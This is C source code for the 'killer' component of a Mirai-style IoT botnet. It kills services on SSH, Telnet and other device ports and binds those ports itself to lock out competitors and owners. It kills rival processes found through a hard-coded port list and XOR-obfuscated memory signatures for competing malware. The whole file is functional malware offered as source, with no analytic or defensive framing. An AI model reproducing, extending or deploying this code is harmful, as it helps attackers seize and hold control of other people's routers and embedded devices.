#define _GNU_SOURCE
#ifdef KILLER
#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/xor.h"
#include "headers/util.h"
int killer_pid = 0, port_killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

#ifdef SSH    
    killer_kill_by_port(htons(22));
    tmp_bind_addr.sin_port = htons(22);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef TELNET
    killer_kill_by_port(htons(23));
    tmp_bind_addr.sin_port = htons(23);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef ZTE
    killer_kill_by_port(htons(8083));
    tmp_bind_addr.sin_port = htons(8083);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef RTK
    killer_kill_by_port(htons(52869));
    tmp_bind_addr.sin_port = htons(52869);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef JAWS
    killer_kill_by_port(htons(60001));
    tmp_bind_addr.sin_port = htons(60001);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef YARN
    killer_kill_by_port(htons(8088));
    tmp_bind_addr.sin_port = htons(8088);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    sleep(3);
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
        return;

    // Kill common mirai ESI (ensure single instance) ports

    killer_kill_by_port(htons(48101));
    killer_kill_by_port(htons(48102));
    killer_kill_by_port(htons(13810));
    killer_kill_by_port(htons(1991));
    killer_kill_by_port(htons(1338));
    killer_kill_by_port(htons(80));
    killer_kill_by_port(htons(443));
    killer_kill_by_port(htons(4321));
    killer_kill_by_port(htons(6667));
    killer_kill_by_port(htons(6697));
    killer_kill_by_port(htons(53413));
    killer_kill_by_port(htons(1337));
    killer_kill_by_port(htons(52869));
    killer_kill_by_port(htons(37215));
    killer_kill_by_port(htons(48101));
    killer_kill_by_port(htons(39459));
    killer_kill_by_port(htons(1991));
    killer_kill_by_port(htons(6666));
    killer_kill_by_port(htons(1312));
    killer_kill_by_port(htons(45));
    killer_kill_by_port(htons(5555));
    killer_kill_by_port(htons(27));
    killer_kill_by_port(htons(1338));
    killer_kill_by_port(htons(420));
    killer_kill_by_port(htons(232));
    killer_kill_by_port(htons(666));
    killer_kill_by_port(htons(1676));
    killer_kill_by_port(htons(443));
    killer_kill_by_port(htons(4321));
    killer_kill_by_port(htons(6667));
    killer_kill_by_port(htons(6697));
    killer_kill_by_port(htons(999));
    killer_kill_by_port(htons(69));
    killer_kill_by_port(htons(21));
    killer_kill_by_port(htons(20));
    killer_kill_by_port(htons(111));
    killer_kill_by_port(htons(777));
    killer_kill_by_port(htons(888));
    killer_kill_by_port(htons(1024));
    killer_kill_by_port(htons(2048));
    killer_kill_by_port(htons(25565));
    
    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
        table_unlock_val(XOR_KILL_PROC);
        if ((dir = opendir(table_retrieve_val(XOR_KILL_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(XOR_KILL_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            int rp_len, fd, pid = atoi(file->d_name);
            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");

            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            }

            util_zero(exe_path, sizeof (exe_path));

            sleep(1);
        }

        closedir(dir);
    }
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(XOR_KILL_PROC);
    table_unlock_val(XOR_KILL_EXE);
    table_unlock_val(XOR_KILL_FD);

    table_unlock_val(XOR_KILL_TCP);
    fd = open(table_retrieve_val(XOR_KILL_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
    if (util_strlen(inode) == 0)
    {
        table_lock_val(XOR_KILL_PROC);
        table_lock_val(XOR_KILL_EXE);
        table_lock_val(XOR_KILL_FD);
        return 0;
    }
    if ((dir = opendir(table_retrieve_val(XOR_KILL_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9')
                continue;
            util_strcpy(ptr_path, table_retrieve_val(XOR_KILL_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(XOR_KILL_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
            util_strcpy(ptr_path, table_retrieve_val(XOR_KILL_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(XOR_KILL_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(XOR_KILL_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(XOR_KILL_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    sleep(1);
    table_lock_val(XOR_KILL_PROC);
    table_lock_val(XOR_KILL_EXE);
    table_lock_val(XOR_KILL_FD);
    table_lock_val(XOR_KILL_TCP);
    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    table_unlock_val(XOR_KILL_PROC);
    table_unlock_val(XOR_KILL_EXE);
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(XOR_KILL_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(XOR_KILL_EXE, NULL));
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);
    table_lock_val(XOR_KILL_PROC);
    table_lock_val(XOR_KILL_EXE);
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }
    util_zero(path, ptr_path - path);
    return TRUE;
}

static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_str1, *m_str2, *m_str3, *m_str4, *m_str5, *m_str6, *m_str7, *m_str8, *m_str9, *m_str10;
    int m_str1_len, m_str2_len, m_str3_len, m_str4_len, m_str5_len, m_str6_len, m_str7_len, m_str8_len, m_str9_len, m_str10_len;
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(XOR_MEM_ROUTE);
    table_unlock_val(XOR_MEM_RC);
    table_unlock_val(XOR_MEM_HTTP);
    table_unlock_val(XOR_MEM_QBOT1);
    table_unlock_val(XOR_MEM_QBOT2);
    table_unlock_val(XOR_MEM_QBOT3);
    table_unlock_val(XOR_MEM_MIRAI);
    table_unlock_val(XOR_MEM_SELF_EXE);
    table_unlock_val(XOR_MEM_UPX);
    table_unlock_val(XOR_MEM_BINSH);

    m_str1 = table_retrieve_val(XOR_MEM_ROUTE, &m_str1_len);
    m_str2 = table_retrieve_val(XOR_MEM_RC, &m_str2_len);
    m_str3 = table_retrieve_val(XOR_MEM_HTTP, &m_str3_len);
    m_str4 = table_retrieve_val(XOR_MEM_QBOT1, &m_str4_len);
    m_str5 = table_retrieve_val(XOR_MEM_QBOT2, &m_str5_len);
    m_str6 = table_retrieve_val(XOR_MEM_QBOT3, &m_str6_len);
    m_str7 = table_retrieve_val(XOR_MEM_MIRAI, &m_str7_len);
    m_str8 = table_retrieve_val(XOR_MEM_SELF_EXE, &m_str8_len);
    m_str9 = table_retrieve_val(XOR_MEM_UPX, &m_str9_len);
    m_str10 = table_retrieve_val(XOR_MEM_BINSH, &m_str10_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_str1, m_str1_len) ||
            mem_exists(rdbuf, ret, m_str2, m_str2_len) ||
            mem_exists(rdbuf, ret, m_str3, m_str3_len) ||
            mem_exists(rdbuf, ret, m_str4, m_str4_len) ||
            mem_exists(rdbuf, ret, m_str5, m_str5_len) ||
            mem_exists(rdbuf, ret, m_str6, m_str6_len) ||
            mem_exists(rdbuf, ret, m_str7, m_str7_len) ||
            mem_exists(rdbuf, ret, m_str8, m_str8_len) ||
            mem_exists(rdbuf, ret, m_str9, m_str9_len) ||
            mem_exists(rdbuf, ret, m_str10, m_str10_len))
        {
            found = TRUE;
            break;
        }
    }
    table_lock_val(XOR_MEM_ROUTE);
    table_lock_val(XOR_MEM_RC);
    table_lock_val(XOR_MEM_HTTP);
    table_lock_val(XOR_MEM_QBOT1);
    table_lock_val(XOR_MEM_QBOT2);
    table_lock_val(XOR_MEM_QBOT3);
    table_lock_val(XOR_MEM_MIRAI);
    table_lock_val(XOR_MEM_SELF_EXE);
    table_lock_val(XOR_MEM_UPX);
    table_lock_val(XOR_MEM_BINSH);
    
    close(fd);
    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}

#endif
